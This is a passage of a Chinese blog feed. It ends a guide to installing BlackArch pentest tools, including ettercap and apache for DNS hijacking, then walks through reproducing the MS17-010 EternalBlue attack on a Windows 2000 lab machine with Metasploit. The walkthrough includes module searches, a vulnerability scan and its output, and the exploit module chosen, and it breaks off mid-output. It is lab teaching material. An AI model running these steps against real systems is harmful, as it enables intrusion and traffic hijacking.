<p>安装完后会多出来一个用户，叫做<code>postgres</code>，我们需要给它设置一个密码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo passwd postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后初始化数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su - postgres -c <span class="s2">&#34;initdb --locale en_US.UTF-8 -E UTF8 -D &#39;/var/lib/postgres/data&#39;&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>初始化完成后就可以启动数据库了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，进入数据库用户postgres</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行<code>psql</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ psql
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后光标就变成了<code>postgres=#</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1">#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>如上面这个样子。</p>
<p>接下来创建一个数据库的新用户，比如<code>msf4</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE USER msf4 WITH PASSWORD &#39;123456&#39;;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后创建对应的数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE DATABASE msfdb OWNER msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将msfdb数据库的所有权限都赋予msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># GRANT ALL PRIVILEGES ON DATABASE msfdb TO msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>退出psql</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># \q</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建Linux普通用户，名称与刚才新建的数据库用户同名，如msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo useradd msf4
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="通过msf连接数据库">通过msf连接数据库</h6>
<p>进入msf，链接数据库，命令为<code>db_connect用户名:密码@ip/数据库名</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5&gt; db_connect msf4:123456@127.0.0.1/msfdb
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后检查是否连接成功，如果出现类似以下内容说明成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_status
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connected to msf3. Connection type: postgresql. Connection name: DFz5oEX3.
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功连接后，别忘了保存以及设置<code>postgresql</code>自启</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_save
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl <span class="nb">enable</span> postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-4">使用方法</h5>
<p>参考<a href="/posts/%e9%9c%87%e6%83%8a16%e5%b2%81%e7%94%b7%e5%ad%90%e7%ab%9f%e7%84%b6%e5%9c%a8%e5%ae%b6%e9%87%8c%e5%81%9a%e5%87%ba%e8%bf%99%e7%a7%8d%e4%ba%8b/" rel="">这篇文章</a></p>
<p>也可通过搜索引擎找更多的教程。</p>
<h4 id="sqlmap">sqlmap</h4>
<p>强大的web注入工具，使用方法可以通过搜索引擎查到。</p>
<h5 id="安装方法-8">安装方法</h5>
<p>执行以下命令安装即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S sqlmap
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dns劫持">DNS劫持</h3>
<h4 id="ettercap">ettercap</h4>
<p>强大的DNS劫持工具，各大搜索引擎也有不少教程。它分为命令行版本和图形化版本，但是只能装其中一个，否则会冲突。</p>
<h5 id="安装方法-9">安装方法</h5>
<p>命令行版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>图形化版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap-gtk
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令行版本在终端执行即可，图形化版本可以在菜单中找到，如果没有执行以下命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo ettercap -G
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="apache">apache</h4>
<p>怎么还有这个东西？这个东西不是建网站的吗，哈哈，其实这个是辅助ettercap的，当你劫持目标DNS以后，会将其强行解析到你的IP，而apache就可以在你的机器上运行一个静态网页（html）。</p>
<h5 id="安装方法-10">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S apache
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-5">使用方法</h5>
<p>执行以下命令启动apache</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>网页根目录为<code>/srv/http/</code></p>
<p>可以在目录下写一个html文件，写完执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl restart httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>以重启apache即可。</p>
<h2 id="小结">小结</h2>
<p>一个普通的Arch Linuxu导入了Black Arch的软件源之后，可以堪称完美的渗透环境了，以上只是常用的工具，而Black Arch软件源里面有几千个工具，想要什么可以通过<code>pacman</code>下载安装，应有尽有。</p>
<p>最后，谢谢访问。</p>
]]></description>
</item><item>
    <title>震惊！16岁男子竟然在家里做出这种事！</title>
    <link>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</link>
    <pubDate>Fri, 26 Jul 2019 22:52:54 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-j5j5vm.jpg" referrerpolicy="no-referrer">
            </div><h2 id="简介">简介</h2>
<p>该男子居然在家做出这种事情，使多数人震惊！</p>
<h2 id="这才是真正的简介">这才是真正的简介</h2>
<p>哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。</p>
<h3 id="ms17-010是啥啊">MS17-010是啥啊？</h3>
<p>你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。</p>
<ul>
<li>那这个漏洞是怎样的呢？我将给出以下链接用于参考：</li>
</ul>
<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener noreffer">Microsoft 安全公告 MS17-010 - 严重</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0143/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0143/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0144/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0144/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0145/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0145/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0146/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0146/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0147/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0147/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0148/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0148/</a></p>
<p><a href="https://github.com/RiskSense-Ops/MS17-010" target="_blank" rel="noopener noreffer">https://github.com/RiskSense-Ops/MS17-010</a></p>
</blockquote>
<h2 id="攻击复现">攻击复现</h2>
<p>那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个<a href="https://baike.baidu.com/item/linux/27050?fr=aladdin" target="_blank" rel="noopener noreffer">Linux</a>的渗透测试软件包。叫做<strong>Metasploit</strong>。 它在作为<strong>渗透测试的发行版</strong>中是自带的，如果你用的不是<strong>作为渗透测试的发行版</strong>，那么以下是安装方法：</p>
<ul>
<li>基于Arch</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>基于Debian更新源里有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt-get install metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>rpm系或deb系源里没有的</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo chmod <span class="m">755</span> msfinstall <span class="o">&amp;&amp;</span> ./msfinstall
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Windows嘛….</li>
</ul>
<blockquote>
<p>两个选择</p>
<ul>
<li>请到<a href="https://www.metasploit.com/" target="_blank" rel="noopener noreffer">MSF官网</a>下载，并且耐心等待。</li>
<li><a href="/posts/linux_mint_%e5%ae%89%e8%a3%85%e6%95%99%e7%a8%8b/" rel="">出门左转</a>安装Linux</li>
</ul>
</blockquote>
<h2 id="复现过程">复现过程</h2>
<blockquote>
<p>重要的事情说三遍：</p>
<p>接下来就是最重要的一部分，你一定要认真看！认真看！认真看！</p>
</blockquote>
<h3 id="攻击环境">攻击环境</h3>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">攻击机</th>
<th style="text-align:center">靶机</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">操作系统</td>
<td style="text-align:center">Arch Linux</td>
<td style="text-align:center">Windows2K</td>
</tr>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.42.141</td>
<td style="text-align:center">192.168.42.252</td>
</tr>
</tbody>
</table>
<p>靶机截图:</p>
<p></p>
<h3 id="攻击过程">攻击过程</h3>
<p>首先，攻击机打开终端，输入 <strong><code>msfconsole</code></strong> ，并按回车等待。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>建议加上<code>sudo</code>，以免出现未知错误。</p>
<p>稍等片刻，metasploit就打开了。如图</p>
<p></p>
<p>接下来，通过 <strong><code>search</code></strong> 命令本次要利用到的MS17_010模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; search ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就跳出一大堆</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Matching Modules
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   #  Name                                           Disclosure Date  Rank     Check  Description
</span></span><span class="line"><span class="cl">   -  ----                                           ---------------  ----     -----  -----------
</span></span><span class="line"><span class="cl">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span class="line"><span class="cl">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span class="line"><span class="cl">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
</span></span><span class="line"><span class="cl">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<blockquote>
<p>顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：</p>
<ol>
<li>search</li>
</ol>
<ul>
<li>用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。</li>
</ul>
<ol start="2">
<li>info</li>
</ol>
<ul>
<li>显示该模块的详细信息。</li>
</ul>
<ol start="3">
<li>show + [option]</li>
</ol>
<ul>
<li>显示该模块的部分信息。</li>
</ul>
<ol start="4">
<li>show options</li>
</ol>
<ul>
<li>显示该模块需要设置的项目</li>
</ul>
<ol start="5">
<li>show payloads</li>
</ol>
<ul>
<li>显示该模块可使用的攻击载荷</li>
</ul>
<p><strong>注意，第三条和第四条不要搞混了，第二条那个[option]是指代。</strong></p>
</blockquote>
<hr>
<p>回归正题，我们先看看这个模块的信息。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后又出了一大堆qwq…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">    Name: MS17-010 SMB RCE Detection
</span></span><span class="line"><span class="cl">     Module: auxiliary/scanner/smb/smb_ms17_010
</span></span><span class="line"><span class="cl">    License: Metasploit Framework License (BSD)
</span></span><span class="line"><span class="cl">       Rank: Normal
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Provided by:
</span></span><span class="line"><span class="cl">  Sean Dillon &lt;sean.dillon@risksense.com&gt;
</span></span><span class="line"><span class="cl">  Luke Jennings
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Check supported:
</span></span><span class="line"><span class="cl">  Yes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Basic options:
</span></span><span class="line"><span class="cl">  Name         Current Setting                                 Required  Description
</span></span><span class="line"><span class="cl">  ----         ---------------                                 --------  -----------
</span></span><span class="line"><span class="cl">  CHECK_ARCH   true                                            no        Check for architecture on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_DOPU   true                                            no        Check for DOUBLEPULSAR on vulnerable hosts
</span></span><span class="line"><span class="cl">  CHECK_PIPE   false                                           no        Check for named pipe on vulnerable hosts
</span></span><span class="line"><span class="cl">  NAMED_PIPES  /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
</span></span><span class="line"><span class="cl">  RHOSTS                                                       yes       The target address range or CIDR identifier
</span></span><span class="line"><span class="cl">  RPORT        445                                             yes       The SMB service port (TCP)
</span></span><span class="line"><span class="cl">  SMBDomain    .                                               no        The Windows domain to use for authentication
</span></span><span class="line"><span class="cl">  SMBPass                                                      no        The password for the specified username
</span></span><span class="line"><span class="cl">  SMBUser                                                      no        The username to authenticate as
</span></span><span class="line"><span class="cl">  THREADS      1                                               yes       The number of concurrent threads
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  Uses information disclosure to determine if MS17-010 has been 
</span></span><span class="line"><span class="cl">  patched or not. Specifically, it connects to the IPC$ tree and 
</span></span><span class="line"><span class="cl">  attempts a transaction on FID 0. If the status returned is 
</span></span><span class="line"><span class="cl">  &#34;STATUS_INSUFF_SERVER_RESOURCES&#34;, the machine does not have the 
</span></span><span class="line"><span class="cl">  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
</span></span><span class="line"><span class="cl">  module will check for an existing DoublePulsar (ring 0 
</span></span><span class="line"><span class="cl">  shellcode/malware) infection. This module does not require valid SMB 
</span></span><span class="line"><span class="cl">  credentials in default server configurations. It can log on as the 
</span></span><span class="line"><span class="cl">  user &#34;\&#34; and connect to IPC$.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">References:
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0143/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0144/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0145/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0146/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0147/
</span></span><span class="line"><span class="cl">  https://cvedetails.com/cve/CVE-2017-0148/
</span></span><span class="line"><span class="cl">  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
</span></span><span class="line"><span class="cl">  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
</span></span><span class="line"><span class="cl">  https://github.com/countercept/doublepulsar-detection-script
</span></span><span class="line"><span class="cl">  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Also known as:
</span></span><span class="line"><span class="cl">  DOUBLEPULSAR
</span></span><span class="line"><span class="cl">  ETERNALBLUE
</span></span></code></pre></td></tr></table>
</div>
</div><p>然而这里我们只需要看那个<strong>Basic options</strong>部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个<strong>目标IP(RHOST)</strong>，而那个 <strong>RPORT(目标端口)</strong> 已经被指定为445了。</p>
<p>接下来执行…</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> rhost 192.168.42.252
</span></span><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>返回后我们得到了这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 <span class="o">(</span>32-bit<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 192.168.42.252:445    - Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span></span></code></pre></td></tr></table>
</div>
</div><p>
说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。</p>
<blockquote>
<p>exploit/windows/smb/ms17_010_psexec</p>
</blockquote>
<p>那么，执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; use exploit/windows/smb/ms17_010_psexec
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来msf5后面的模块就变成了攻击模块了。

然后继续执行info，没错，又会弹出一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; info
</span></span></code></pre></td></tr></table>
</div>
</div><p>对，就是下面这一大堆。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
